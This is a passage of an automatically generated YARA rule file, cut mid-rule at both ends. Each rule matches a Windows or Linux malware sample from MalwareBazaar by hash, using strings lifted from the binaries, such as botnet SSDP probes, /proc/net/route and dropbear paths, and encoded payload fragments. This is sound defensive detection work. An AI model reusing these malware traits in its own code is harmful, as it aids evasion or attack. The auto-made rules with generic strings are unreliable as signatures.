        $s3 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s4 = "x2F/x2B/x32/x33/x3D/x2F/x3C/x7D/x70/x22/x3F/x28/x27/x20/x2E/x30/x74/x3F/x74/x23/x72/x70/x35/x33/x36/x26/x74/x2C/x31/x2D/x75/x2F/x2B/x21/x7D/x3D/x2B/x37/x33/x32/x70/x21/x36/x2B/x32/x2D/x3F/x3F/x2C/x71/x32/x36/x2B/x3F/x74/x30/x27/x34/x28/x26/x2B/x36/x21/x35/x36/x2B/x7D/x7D/x73/x72/x2B/x33/x24/x75/x26/x2F/x37/x22/x70/x24/x31/x36/x76/x72/x32/x35/x76/x70/x75/x35/x21/x20/x2A/x2C/x76/x20/x74/x21/x75/x2A/x28/x37/x33/x76/x34/x71/x2E/x77/x26/x72/x27/x2F/x2F/x30/x2B/x27/x74/x30/x3F/x26/x2B/x34/x29/x75/x2C/x23/x7C/x21/x77/x31/x29/x76/x21/x74/x23/x2F/x37/x20/x73/x3F/x30/x30/x2D/x3D/x29/x22/x26/x72/x31/x24/x45"
        $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        $s6 = "%s /%s HTTP/1.1"
        $s7 = "GET /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s8 = "/proc/net/route"
        $s9 = "/usr/bin/python"
        $s10 = "/usr/sbin/dropbear"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 102KB
        and all of them
}

rule Windows_9db60b72564e40228aca83cb722774dab5989a5dc6349b5cddb276c0b4facbcd{
    meta:
        description = "Auto ML: 9db60b72564e40228aca83cb722774dab5989a5dc6349b5cddb276c0b4facbcd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".idata"
        $s3 = "advapi32.dll"
        $s4 = "setupx.dll"
        $s5 = "setupapi.dll"
        $s6 = "advpack.dll"
        $s7 = "wininit.ini"
        $s8 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s9 = "msdownld.tmp"
        $s10 = "Control Panel\\Desktop\\ResourceLocale"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4410KB
        and all of them
}

rule Windows_101b9564ba11aa44372b37b1143eac0d5dd1e3f38c6a35517de843b9f23b3704{
    meta:
        description = "Auto ML: 101b9564ba11aa44372b37b1143eac0d5dd1e3f38c6a35517de843b9f23b3704"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "nbeffd.exe"
        $s4 = "SmartAssembly.Delegates"
        $s5 = "SmartAssembly.HouseOfCards"
        $s6 = "System.IO"
        $s7 = "SmartAssembly.Attributes"
        $s8 = "System.Collections.Generic"
        $s9 = "System.Management"
        $s10 = ".ctor"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15775KB
        and all of them
}

rule Windows_9dfb6b41c90732c9206ef6f65a941b1061126ead69e3715d79519196dad5899c{
    meta:
        description = "Auto ML: 9dfb6b41c90732c9206ef6f65a941b1061126ead69e3715d79519196dad5899c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "Ee/Ig"
        $s4 = "nj.8R"
        $s5 = "8/p.Cy"
        $s6 = "r9.V7"
        $s7 = "a.IqZ"
        $s8 = "P-.xaw"
        $s9 = "1ta/P"
        $s10 = "tlu.T"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 688KB
        and all of them
}

rule Linux_9e3a90d55876cfb63c8aba18224530badf9b1747e4f4c9ceb5ce776f86b0c3c2{
    meta:
        description = "Auto ML: 9e3a90d55876cfb63c8aba18224530badf9b1747e4f4c9ceb5ce776f86b0c3c2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "8cc\\H"
        $s2 = "I.8cdx"
        $s3 = "QJD.QJ"
        $s4 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s5 = "M-SEARCH * HTTP/1.1"
        $s6 = "HOST: 255.255.255.255:1900"
        $s7 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s8 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s9 = "GET /"
        $s10 = "HEAD /"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 145KB
        and all of them
}

rule Windows_9e3adf4d29ff613f70e43fd757589ade8407b408eb3784e853e01bf067234eed{
    meta:
        description = "Auto ML: 9e3adf4d29ff613f70e43fd757589ade8407b408eb3784e853e01bf067234eed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".idata"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Ht Ht."
        $s6 = "kernel32.dll"
        $s7 = "m/d/yy"
        $s8 = ".DEFAULT\\Control Panel\\International"
        $s9 = "Control Panel\\Desktop\\ResourceLocale"
        $s10 = "The setup files are corrupted. Please obtain a new copy of the program."

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6687KB
        and all of them
}

rule Windows_9e682a45b78d5a76d6afe9c523a1900d816edbabfecd9fb93165e9b26e694f4f{
    meta:
        description = "Auto ML: 9e682a45b78d5a76d6afe9c523a1900d816edbabfecd9fb93165e9b26e694f4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".39o6Mkqk"
        $s3 = "8B\\pF"
        $s4 = "Okw.JGJmdXHa"
        $s5 = "Okw.JGJmd\\b"
        $s6 = "qwALmdeMB\\L"
        $s7 = "JgJn\\H5v"
        $s8 = "/iQfJ"
        $s9 = "hrq.qGJm"
        $s10 = ":IG3\\o_IVGLJH5"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 521KB
        and all of them
}

rule Windows_9e6fa1f280864e2933528e17984bf2d448b003bda842145f34e63cc8a4b337ef{
    meta:
        description = "Auto ML: 9e6fa1f280864e2933528e17984bf2d448b003bda842145f34e63cc8a4b337ef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "1/rp1"
        $s3 = "pHl\\t"
        $s4 = "S9v.i"
        $s5 = "\\65u8"
        $s6 = "\\sG7tPD"
        $s7 = "Oh44\\Q"
        $s8 = ".97yY"
        $s9 = "BFUa.X"
        $s10 = "2\\tHlWB"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Windows_9e900bf1cc6d62045a6e460c8f366c7c062cb5357d21029e9733f5926a8770fd{
    meta:
        description = "Auto ML: 9e900bf1cc6d62045a6e460c8f366c7c062cb5357d21029e9733f5926a8770fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".ndata"
        $s3 = ".rsrc"
        $s4 = "tZj\\V"
        $s5 = "\\u f9O"
        $s6 = "ADVAPI32.dll"
        $s7 = "SHELL32.dll"
        $s8 = "ole32.dll"
        $s9 = "COMCTL32.dll"
        $s10 = "USER32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB
        and all of them
}

rule Windows_9e9d1ce30d8beb027b25d7bd48023324fcdbbb26dffad6b5ff49e1f8ae700d82{
    meta:
        description = "Auto ML: 9e9d1ce30d8beb027b25d7bd48023324fcdbbb26dffad6b5ff49e1f8ae700d82"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "System.Data"
        $s4 = "System.Collections.Generic"
        $s5 = "ldBz.exe"
        $s6 = "System.Runtime.Versioning"
        $s7 = "System.Drawing"
        $s8 = "System.ComponentModel"
        $s9 = "System.Configuration"
        $s10 = "System.Globalization"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 712KB
        and all of them
}

rule Windows_9eabf4c63eb61d6f57d39f04f1cef92117318a04731b8f61f6139d1600d092fd{
    meta:
        description = "Auto ML: 9eabf4c63eb61d6f57d39f04f1cef92117318a04731b8f61f6139d1600d092fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".tokek"
        $s3 = ".yeva"
        $s4 = ".rsrc"
        $s5 = "F\\HyB"
        $s6 = "F0Pj."
        $s7 = "F4Pj/"
        $s8 = "FTPjK"
        $s9 = "F\\PjM"
        $s10 = "FtPj;"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 252KB
        and all of them
}

rule Windows_9efc56963653ce8b7f63f767d39b32d72bbf8d318de43c4434002b853e3728eb{
    meta:
        description = "Auto ML: 9efc56963653ce8b7f63f767d39b32d72bbf8d318de43c4434002b853e3728eb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".pdata"
        $s3 = "vaD95\\"
        $s4 = "s.fff"
        $s5 = "M0t/H"
        $s6 = "s.D95"
        $s7 = "9X\\vLH"
        $s8 = "\\78L9-IwL"
        $s9 = "E9f\\vLI"
        $s10 = ".5Vt0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_9f03fa5d064cc8b7891502834a7737ce015d3a23a6eae3793481014f6cf73131{
    meta:
        description = "Auto ML: 9f03fa5d064cc8b7891502834a7737ce015d3a23a6eae3793481014f6cf73131"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "System.Runtime.CompilerServices"
        $s4 = ".ctor"
        $s5 = "System.Diagnostics"
        $s6 = "System.Reflection"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Runtime.Versioning"
        $s9 = "System.Resources"
        $s10 = "exercises_with_the_training_complex.exe"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4980KB
        and all of them
}

rule Linux_108615c0884401ca10eb2a9cf205766e2554e0001c7c67570e19d20254362bf8{
    meta:
        description = "Auto ML: 108615c0884401ca10eb2a9cf205766e2554e0001c7c67570e19d20254362bf8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/net/route"
        $s2 = "/x03/x23/x07/x82/x05/x84/x03/x23/x07/x82/x05/x84/x03/x23/x07/x82/x05/x84/x03/x23/x07/x82/x05/x84/x03/x23/x07/x82/x05/x84/x03/x23/x07/x82/x05/x84/x03/x23/x07/x82/x05/x84/x03/x23/x07/x82/x05/x84"
        $s3 = "PATCH /%s HTTP/1.1"
        $s4 = "/usr/lib/rkt"
        $s5 = "/usr/lib/portage"
        $s6 = "/usr/bin/yum"
        $s7 = "/var/lib/YaST2"
        $s8 = "/usr/local/etc/pkg"
        $s9 = "/usr/bin/miniterm.py"
        $s10 = "/etc/dropbear/"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB
        and all of them
}

rule Linux_9f0a21abb820c48fff9be30e033b888d392c26143d5950a3b65ff739d2203711{
    meta:
        description = "Auto ML: 9f0a21abb820c48fff9be30e033b888d392c26143d5950a3b65ff739d2203711"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s6 = "GET /"
        $s7 = "HEAD /"
        $s8 = "POST /"
        $s9 = "HTTP/1.1 404 Not Found"
        $s10 = "HTTP/1.1 200 OK"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 142KB
        and all of them
}

rule Windows_9f2bfb93647496f466b54b7b5405db565fb23b51b71f0fd97d034b24113d4b93{
    meta:
        description = "Auto ML: 9f2bfb93647496f466b54b7b5405db565fb23b51b71f0fd97d034b24113d4b93"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".pdata"
        $s3 = "Error on file."
        $s4 = "%s%c%s.exe"
        $s5 = "Could not get __main__ module."
        $s6 = "Failed to get executable path."
        $s7 = "Failed to convert executable path to UTF-8."
        $s8 = "base_library.zip"
        $s9 = "ucrtbase.dll"
        $s10 = "Path of ucrtbase.dll (%s) length exceeds buffer[%d] space"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7166KB
        and all of them
}

rule Linux_9f48a3bdfe0cc51c921a110a22d044e3017c428129b02895d3ad1e88b86853ea{
    meta:
        description = "Auto ML: 9f48a3bdfe0cc51c921a110a22d044e3017c428129b02895d3ad1e88b86853ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/BQxHoQxB"
        $s2 = "HoQl/"
        $s3 = "ht 1\\"
        $s4 = "ht 0\\"
        $s5 = "NuNq/"
        $s6 = "HTTP/1.1"
        $s7 = "GET /"
        $s8 = "HEAD /"
        $s9 = "POST /"
        $s10 = "HTTP/1.1 404 Not Found"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 83KB
        and all of them
}

rule Windows_9f8c457038dec8b3ce15996b078008bd5ec3d817b969da6bce8c6902a513d225{
    meta:
        description = "Auto ML: 9f8c457038dec8b3ce15996b078008bd5ec3d817b969da6bce8c6902a513d225"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rdata"
        $s3 = ".idata"
        $s4 = ".rsrc"
        $s5 = "l.dlt"
        $s6 = "libgcc_s_dw2-1.dll"
        $s7 = "KERNEL32.dll"
        $s8 = "msvcrt.dll"
        $s9 = "Microsoft Corporation. All rights reserved."
        $s10 = "EXPLORER.EXE"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 24KB
        and all of them
}

rule Linux_9fb8dda8f6fc2cd2b0839f18a08ab7d10bf2a6a4092201d00075438d4f6c22b6{
    meta:
        description = "Auto ML: 9fb8dda8f6fc2cd2b0839f18a08ab7d10bf2a6a4092201d00075438d4f6c22b6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "FTPjGNRGP\""
        $s4 = ".shstrtab"
        $s5 = ".init"
        $s6 = ".text"
        $s7 = ".fini"
        $s8 = ".rodata"
        $s9 = ".ctors"
        $s10 = ".dtors"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 73KB
        and all of them
}

rule Linux_9fd2f8e4d8c7fda38a736de0f34b41a38c0be7fb1456803ba501db4153efa9e3{
    meta:
        description = "Auto ML: 9fd2f8e4d8c7fda38a736de0f34b41a38c0be7fb1456803ba501db4153efa9e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s6 = "/proc/"
        $s7 = "/proc/net/tcp"
        $s8 = "/dev/null"
        $s9 = ".shstrtab"
        $s10 = ".init"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB
        and all of them
}

rule Windows_9fedab2bb4115b0afcd184c958283df5b436cbf800fb9de2678719bf9071d9f5{
    meta:
        description = "Auto ML: 9fedab2bb4115b0afcd184c958283df5b436cbf800fb9de2678719bf9071d9f5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "System.IO"
        $s4 = "System.Xml.Schema"
        $s5 = "System.Data"
        $s6 = "System.Web"
        $s7 = "Microsoft.VisualBasic"
        $s8 = "System.Threading"
        $s9 = "System.Runtime.Versioning"
        $s10 = "System.Drawing"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 607KB
        and all of them
}

rule Windows_a05b3641cca29aead4899ddbf33718b54b209fc06c5c9483162264ee52511ba7{
    meta:
        description = "Auto ML: a05b3641cca29aead4899ddbf33718b54b209fc06c5c9483162264ee52511ba7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "9:N/5"
        $s4 = "/l-s."
        $s5 = "K/zxYL"
        $s6 = "\\6j8q"
        $s7 = "TC7\\m"
        $s8 = "DY.MR_"
        $s9 = "lQ0/e"
        $s10 = "KjNFe."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 232KB
        and all of them
}

rule Windows_a07acb9e54269e5554a96548c50337f564cbce39ffc4fa797438a05dd6d993dd{
    meta:
        description = "Auto ML: a07acb9e54269e5554a96548c50337f564cbce39ffc4fa797438a05dd6d993dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "s\\d48"
        $s3 = "9h/Ed"
        $s4 = "k.G7c"
        $s5 = "\\WREH"
        $s6 = "9iT/8"
        $s7 = "5Bi/g"
        $s8 = "1Ge\\X"
        $s9 = "wTWu/R"
        $s10 = "uW\\x2/XA1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3424KB
        and all of them
}

rule Windows_a07c09068aad2ec47ece4b529dea840125654f551429c331f67b34833ba84110{
    meta:
        description = "Auto ML: a07c09068aad2ec47ece4b529dea840125654f551429c331f67b34833ba84110"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".idata"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Ht Ht."
        $s6 = "kernel32.dll"
        $s7 = "m/d/yy"
        $s8 = ".DEFAULT\\Control Panel\\International"
        $s9 = "Control Panel\\Desktop\\ResourceLocale"
        $s10 = "The setup files are corrupted. Please obtain a new copy of the program."

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6685KB
        and all of them
}

rule Windows_10b43fb2634085b6ab64fc9f92be8727a8b0162eb74341297a23f9bdbd89ecd1{
    meta:
        description = "Auto ML: 10b43fb2634085b6ab64fc9f92be8727a8b0162eb74341297a23f9bdbd89ecd1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "v4.0.30319"
        $s3 = "System.IO"
        $s4 = "System.Data"
        $s5 = "System.Collections.Generic"
        $s6 = "System.Collections.Specialized"
        $s7 = "qqiQ.exe"
        $s8 = "System.Threading"
        $s9 = "System.Runtime.Versioning"
        $s10 = "System.Drawing"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 685KB
        and all of them
}

rule Linux_a07e42a6c632f85095e7cc6f87268df742ead45854ca5a65a8d7492d08e76bbc{
    meta:
        description = "Auto ML: a07e42a6c632f85095e7cc6f87268df742ead45854ca5a65a8d7492d08e76bbc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
